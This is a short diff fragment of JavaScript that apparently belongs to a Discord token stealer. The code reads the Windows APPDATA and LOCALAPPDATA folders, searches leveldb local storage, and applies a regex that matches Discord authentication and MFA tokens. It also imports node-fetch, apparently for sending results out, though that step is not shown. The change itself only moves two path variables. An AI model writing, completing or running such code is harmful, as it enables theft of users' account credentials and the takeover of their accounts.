@@ -4,13 +4,13 @@ const mention = true; // if you don't want a mention change it to false
 const fetch = require("node-fetch"); // npm i node-fetch
 const { sep } = require("path");
 const { readFileSync, readdirSync, existsSync } = require("fs");
+const roaming = process.env.APPDATA;
+const local = process.env.LOCALAPPDATA;
 function sleep(ms) {
   return new Promise((resolve) => setTimeout(resolve, ms));
 }
 if (process.platform === "win32") {
   function main() {
-    const roaming = process.env.APPDATA;
-    const local = process.env.LOCALAPPDATA;
     function findt(path = String()) {
       const reg = /[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}|mfa\.[\d\w_-]{84}/g;
       path = path + "\\Local Storage\\leveldb";
